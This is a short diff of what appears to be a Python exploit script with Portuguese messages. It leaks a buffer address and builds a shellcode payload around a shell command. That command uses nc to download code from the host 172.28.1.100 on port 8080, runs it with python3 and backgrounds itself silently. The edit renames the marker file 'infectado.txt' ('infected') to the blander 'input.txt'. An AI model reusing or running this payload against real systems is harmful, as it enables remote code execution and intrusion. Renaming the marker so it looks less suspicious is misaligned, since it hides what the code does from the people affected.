@@ -162,7 +162,7 @@ def main():
         return
     print(f"Endereço do buffer: {hex(bufaddr)}")
 
-    shellcode = create_hex_command(b"(echo 'true' > infectado.txt ; nc -w3 172.28.1.100 8080 < /dev/null > main.py ; python3 main.py > out.txt) < /dev/null > /dev/null 2>&1 &")
+    shellcode = create_hex_command(b"(echo 'true' > input.txt ; nc -w3 172.28.1.100 8080 < /dev/null > main.py ; python3 main.py > out.txt) < /dev/null > /dev/null 2>&1 &")
 
     payload = getFile(bufaddr, shellcode)
 
